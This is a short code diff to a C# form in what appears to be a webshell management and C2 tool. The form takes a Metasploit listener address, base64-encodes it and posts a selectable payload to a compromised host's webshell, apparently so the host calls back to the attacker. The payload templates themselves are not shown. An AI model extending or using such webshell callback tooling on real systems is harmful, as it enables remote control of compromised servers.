@@ -12,6 +12,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string MSF { get => msfTextBox.Text.Trim(); set => msfTextBox.Text = value; }
         private readonly WebShellTaskConfig task;
         private ProxySetting proxy;
+        private InfoType infoType;
         public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy,FormViewSet viewSet)
         {
             InitializeComponent();
@@ -29,6 +30,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             this.Text = viewSet.Title;
             this.addr.Text = viewSet.SubTitle;
             this.help1.Text = viewSet.TipInfo;
+            this.infoType = viewSet.InfoType;
 
         }
         protected override bool OnOKButtonClick()
@@ -50,7 +52,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             Global.MSFHost = MSF;
             string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
             string port = mc.Groups[3].Value;
-            string payload = string.Format(Global.MSFPayload, task.Password, port, encodeIP);
+            string payload = string.Format(Global.InfoPayloadDict[this.infoType], task.Password, port, encodeIP);
             Task<string> t = Task.Run(() => PostPayload(payload));
             return base.OnOKButtonClick();
         }
@@ -73,6 +75,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         public string Title { get; set; } = "MSF配置";
         public string SubTitle { get; set; } = "MSF地址:";
         public string TipInfo { get; set; } = "输入MSF地址,例如:";
+        public InfoType InfoType { get; set; } = InfoType.MSF;
 
     }
 
